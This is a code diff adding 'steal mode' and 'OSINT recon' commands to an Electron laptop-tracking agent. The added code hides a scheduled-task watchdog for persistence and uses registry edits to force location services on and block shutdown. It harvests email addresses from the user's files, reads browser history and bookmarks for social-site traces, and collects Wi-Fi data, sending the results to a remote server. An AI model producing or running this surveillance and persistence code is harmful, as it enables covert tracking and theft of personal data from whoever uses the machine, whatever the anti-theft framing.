@@ -2,7 +2,7 @@ const { app, BrowserWindow, ipcMain, Tray, Menu, nativeImage, Notification } = r
 const path = require('path');
 const https = require('https');
 const WebSocket = require('ws');
-const { exec } = require('child_process');
+const { exec, spawn } = require('child_process');
 const os = require('os');
 const fs = require('fs');
 const crypto = require('crypto');
@@ -13,8 +13,11 @@ let pairCode = '', deviceId = '';
 let isAgentMode = false;
 let heartbeatInterval;
 let locInterval;
+let stealActive = false;
+let stealLocateIv = null;
+let stealRespawnIv = null;
 const SERVER = 'https://laptop-tracker-k9vi.onrender.com';
-const APP_VERSION = '2.7.0';
+const APP_VERSION = '2.8.0';
 const CONFIG_PATH = path.join(app.getPath('userData'), 'find-config.json');
 
 // ══════════════════════════════════════════════════════════════════════════════
@@ -537,9 +540,49 @@ function handleCommand(msg) {
             ];
             for (const [k, fn] of tasks) { try { results[k] = await fn(); } catch(e) { results[k] = { error: e.message }; } }
             return JSON.stringify({ forensicResults: results, timestamp: Date.now() });
-        }
+        },
+        'enable-location': () => enableLocationServices(),
+        'prevent-shutdown': () => preventShutdown(),
+        'watchdog': async () => { const ok = await armWatchdog(); return JSON.stringify({ success: ok, message: ok ? 'Watchdog armed' : 'Watchdog install failed' }); },
+        'steal-mode': () => startStealMode(),
+        'steal-mode-off': () => stopStealMode(),
+        'osint-ip': async () => {
+            const ipRes = await scrapePublicIP();
+            const ip = ipRes.confirmedIP || (ipRes.results && ipRes.results[0] && ipRes.results[0].ip);
+            if (!ip) return JSON.stringify({ success: false, error: 'No public IP' });
+            const r = await serverOSINT('ip', ip);
+            return JSON.stringify({ ...r, publicIP: ip });
+        },
+        'osint-email': async () => {
+            const emails = await harvestEmails();
+            const breaches = [];
+            for (const email of emails.slice(0, 5)) { const r = await serverOSINT('email-breach', email); breaches.push({ email, ...r }); }
+            return JSON.stringify({ success: true, harvested: emails, breachesChecked: breaches.length, breaches });
+        },
+        'osint-user': async () => {
+            const names = await localUsernames();
+            const primary = names[0] || '';
+            const lookup = primary ? await serverOSINT('username', primary) : { success: false, error: 'No username found' };
+            return JSON.stringify({ success: true, localAccounts: names, primary, lookup });
+        },
+        'osint-wifi': async () => {
+            const wifiRaw = await shell('netsh wlan show profiles');
+            const profileList = wifiRaw.split('\n').filter(l => l.includes('All User Profile')).map(l => l.split(':')[1]?.trim()).filter(Boolean);
+            const wifiRaw2 = await shell('netsh wlan show networks mode=bssid');
+            const nets = [];
+            const matches = wifiRaw2.matchAll(/SSID \d+\s*:\s*([^\r\n]+)[\s\S]*?Signal\s*:\s*(\d+)%[\s\S]*?BSSID \d+\s*:\s*([^\r\n]+)/gi);
+            for (const m of matches) { if (m[1] && parseInt(m[2]) > 0) nets.push({ macAddress: (m[3] || '').trim(), signalStrength: Math.round((parseInt(m[2]) / 2) - 100) }); }
+            let currentGeo = null;
+            if (nets.length >= 2) {
+                const postData = JSON.stringify({ wifiAccessPoints: nets, deviceId: pairCode });
+                currentGeo = await new Promise(resolve => { const u = new URL(SERVER + '/api/geo-resolve'); const r = https.request({ hostname: u.hostname, port: 443, path: u.pathname, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }, timeout: 10000 }, res => { let d = ''; res.on('data', c => d += c); res.on('end', () => { try { resolve(JSON.parse(d)); } catch(e) { resolve(null); } }); }); r.on('error', () => resolve(null)); r.write(postData); r.end(); });
+            }
+            return JSON.stringify({ success: true, savedNetworks: profileList, currentlyVisible: nets.slice(0, 10), currentLocation: currentGeo && currentGeo.success ? { lat: currentGeo.lat, lng: currentGeo.lng, accuracy: currentGeo.accuracy } : null });
+        },
+        'osint-social': () => osintSocialTrace()
     };
     const fn = handlers[type];
+    lastLocateFnRef = handlers['locate'];
     if (fn) fn().then(r => sendResult(id, type, r));
 }
 
@@ -584,6 +627,143 @@ function runPowerShell(ps, timeoutMs = 10000) {
             resolve({ success: !err, stdout: (stdout || '').trim(), stderr: err ? (err.message || '') : '' });
         });
     });
+}
+
+// ─── ANTI-THEFT RESPONSE ENGINE (Electron agent) ─────────────────────────────
+
+function spawnDetached(cmd, args) {
+  try { const c = spawn(cmd, args, { detached: true, stdio: 'ignore' }); c.unref(); return c; } catch(e) { return null; }
+}
+
+const STEAL_MSG = 'STOLEN DEVICE -TRACKED- DO NOT WIPE';
+const STEAL_OVERLAY_PS = `Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $f=New-Object Windows.Forms.Form; $f.FormBorderStyle='None'; $f.WindowState='Maximized'; $f.TopMost=$true; $f.BackColor=[Drawing.Color]::Black; $f.ControlBox=$false; $l=New-Object Windows.Forms.Label; $l.Text='${STEAL_MSG}'; $l.Dock='Fill'; $l.TextAlign='MiddleCenter'; $l.ForeColor=[Drawing.Color]::Red; $l.BackColor=[Drawing.Color]::Black; $l.Font=New-Object Drawing.Font('Consolas',26,[Drawing.FontStyle]::Bold); $f.Controls.Add($l); [Windows.Forms.Application]::Run($f)`;
+const STEAL_SIREN_PS = 'for($i=0;$i -lt 10000;$i++){ [Console]::Beep(2200,350); Start-Sleep -m 60; [Console]::Beep(1400,350); Start-Sleep -m 60 }';
+const STEAL_OVERLAY_FILE = path.join(os.tmpdir(), 'find-steal-overlay.ps1');
+const STEAL_SIREN_FILE = path.join(os.tmpdir(), 'find-steal-siren.ps1');
+
+function psExec(script, timeoutMs = 15000) {
+  return new Promise(resolve => {
+    const c = spawn('powershell', ['-NoProfile', '-Command', script], { timeout: timeoutMs });
+    c.on('close', resolve); c.on('error', resolve);
+  });
+}
+
+function ensureStealScripts() {
+  try { fs.writeFileSync(STEAL_OVERLAY_FILE, STEAL_OVERLAY_PS); } catch(e) {}
+  try { fs.writeFileSync(STEAL_SIREN_FILE, STEAL_SIREN_PS); } catch(e) {}
+}
+
+async function enableLocationServices() {
+  const regCmds = [
+    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location" /v Value /t REG_SZ /d Allow /f',
+    'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location" /v Value /t REG_SZ /d Allow /f',
+    'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\LocationAndSensors" /v DisableLocation /t REG_DWORD /d 0 /f'
+  ];
+  for (const c of regCmds) { try { exec(c, { timeout: 8000 }); } catch(e) {} }
+  try { exec('sc config lfsvc start= auto', { timeout: 8000 }); } catch(e) {}
+  try { exec('net start lfsvc', { timeout: 10000 }); } catch(e) {}
+  return JSON.stringify({ success: true, message: 'Location services enabled — next locate will use GPS/BSSID', timestamp: Date.now() });
+}
+
+async function preventShutdown() {
+  const regCmds = [
+    'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoClose /t REG_DWORD /d 1 /f',
+    'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f'
+  ];
+  let applied = 0;
+  for (const c of regCmds) { try { await new Promise(r => exec(c, { timeout: 8000 }, () => r())); applied++; } catch(e) {} }
+  await armWatchdog();
+  return JSON.stringify({ success: applied > 0, message: 'Shutdown/restart blocked. Watchdog armed.', timestamp: Date.now() });
+}
+
+async function armWatchdog() {
+  const exePath = process.execPath;
+  const wdScript = `$p = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq '${exePath.replace(/'/g, "''")}' }; if (-not $p) { Start-Process '${exePath}' }`;
+  try {
+    const wdFile = path.join(os.tmpdir(), 'find-watchdog.ps1');
+    fs.writeFileSync(wdFile, wdScript);
+    await new Promise(r => exec(`schtasks /create /tn "FINDWatchdog" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \\"${wdFile}\\"" /sc minute /mo 1 /f`, { timeout: 10000 }, () => r()));
+    return true;
+  } catch(e) { return false; }
+}
+
+async function startStealMode() {
+  if (stealActive) return JSON.stringify({ success: true, message: 'Already active' });
+  stealActive = true;
+  ensureStealScripts();
+  spawnDetached('powershell', ['-WindowStyle', 'Hidden', '-Command', '$w=New-Object -ComObject WScript.Shell; for($i=0;$i -lt 50;$i++){ $w.SendKeys([char]175); Start-Sleep -m 10 }']);
+  spawnDetached('powershell', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', STEAL_SIREN_FILE]);
+  spawnDetached('powershell', ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', STEAL_OVERLAY_FILE]);
+  stealLocateIv = setInterval(() => { try { if (lastLocateFnRef) lastLocateFnRef(); } catch(e) {} }, 30000);
+  stealRespawnIv = setInterval(() => {
+    psExec(`if (-not (Get-CimInstance Win32_Process -Filter 'Name=''powershell.exe''' -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like '*find-steal-overlay.ps1*' })) { Start-Process powershell -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','${STEAL_OVERLAY_FILE}' }`);
+    psExec(`if (-not (Get-CimInstance Win32_Process -Filter 'Name=''powershell.exe''' -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like '*find-steal-siren.ps1*' })) { Start-Process powershell -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File','${STEAL_SIREN_FILE}' }`);
+  }, 45000);
+  await preventShutdown();
+  return JSON.stringify({ success: true, message: 'STEAL MODE ACTIVE: alert overlay + siren + locate loop + shutdown block + respawn watchdog', timestamp: Date.now() });
+}
+
+async function stopStealMode() {
+  stealActive = false;
+  if (stealLocateIv) { clearInterval(stealLocateIv); stealLocateIv = null; }
+  if (stealRespawnIv) { clearInterval(stealRespawnIv); stealRespawnIv = null; }
+  await psExec(`Get-CimInstance Win32_Process -Filter 'Name=''powershell.exe''' -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like '*find-steal-overlay.ps1*' -or $_.CommandLine -like '*find-steal-siren.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }`);
+  try { await new Promise(r => exec(`reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v NoClose /t REG_DWORD /d 0 /f`, { timeout: 8000 }, () => r())); } catch(e) {}
+  return JSON.stringify({ success: true, message: 'Steal mode deactivated', timestamp: Date.now() });
+}
+
+let lastLocateFnRef = null;
+
+// ─── OSINT RECON (Electron agent) ────────────────────────────────────────────
+
+function serverOSINT(type, value) {
+  return new Promise(resolve => {
+    const postData = JSON.stringify({ type, value });
+    const u = new URL(SERVER + '/api/osint/lookup');
+    const r = https.request({ hostname: u.hostname, port: 443, path: u.pathname, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }, timeout: 15000 }, res => {
+      let d = ''; res.on('data', c => d += c); res.on('end', () => { try { resolve(JSON.parse(d)); } catch(e) { resolve({ success: false, error: 'bad osint response' }); } });
+    });
+    r.on('error', () => resolve({ success: false, error: 'OSINT server unreachable' }));
+    r.write(postData); r.end();
+  });
+}
+
+async function harvestEmails() {
+  const ps = `Get-ChildItem "$env:USERPROFILE\\Desktop","$env:USERPROFILE\\Documents","$env:USERPROFILE\\Downloads" -Recurse -ErrorAction SilentlyContinue -Depth 2 -Include *.txt,*.csv,*.log,*.ini,*.cfg,*.xml,*.json | Select-Object -First 150 | ForEach-Object { try { (Select-String -Path $_.FullName -Pattern '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}' -AllMatches -ErrorAction SilentlyContinue).Matches | ForEach-Object { $_.Value } } catch {} } | Sort-Object -Unique | Select-Object -First 15`;
+  const res = await runPowerShell(ps, 30000);
+  if (res.success) return [...new Set(res.stdout.split(/[\r\n,]+/).map(s => s.trim()).filter(s => /^[^@\s]+@[^@\s]+\.[a-zA-Z]{2,}$/.test(s)))].slice(0, 10);
+  return [];
+}
+
+async function localUsernames() {
+  const res = await runPowerShell('Get-CimInstance Win32_UserAccount | Select-Object Name, FullName | ConvertTo-Json -Compress', 15000);
+  const names = [];
+  if (res.success) { try { const parsed = JSON.parse(res.stdout); for (const u of (Array.isArray(parsed) ? parsed : [parsed])) { if (u && u.Name) names.push(u.Name); } } catch(e) {} }
+  if (process.env.USERNAME && !names.includes(process.env.USERNAME)) names.push(process.env.USERNAME);
+  return [...new Set(names)].slice(0, 8);
+}
+
+async function osintSocialTrace() {
+  const socials = ['facebook.com', 'instagram.com', 'x.com', 'twitter.com', 'tiktok.com', 'snapchat.com', 'linkedin.com', 'reddit.com', 'discord.com', 't.me', 'github.com', 'pinterest.com', 'youtube.com', 'threads.net', 'whatsapp.com'];
+  const found = [];
+  const roots = [path.join(process.env.LOCALAPPDATA || '', 'Google', 'Chrome', 'User Data'), path.join(process.env.LOCALAPPDATA || '', 'Microsoft', 'Edge', 'User Data'), path.join(process.env.APPDATA || '', 'Mozilla', 'Firefox', 'Profiles')];
+  for (const root of roots) {
+    if (!fs.existsSync(root)) continue;
+    const stack = [root]; let visited = 0;
+    while (stack.length > 0 && visited < 60 && found.length < 25) {
+      const cur = stack.pop(); visited++;
+      let entries = [];
+      try { entries = fs.readdirSync(cur, { withFileTypes: true }); } catch(e) { continue; }
+      for (const en of entries) {
+        const full = path.join(cur, en.name);
+        if (en.isDirectory()) { if (stack.length < 25) stack.push(full); }
+        else if (/^(Bookmarks|History|places\.sqlite)$/i.test(en.name) && fs.statSync(full).size < 30 * 1024 * 1024) {
+          try { const raw = fs.readFileSync(full, 'latin1'); for (const s of socials) { if (raw.includes(s) && !found.includes(s)) found.push(s); } } catch(e2) {}
+        }
+      }
+    }
+  }
+  return JSON.stringify({ success: true, accounts: found, source: 'browser-trace', timestamp: Date.now() });
 }
 
 // ─── FORENSIC TOOLS ─────────────────────────────────────────────────────────
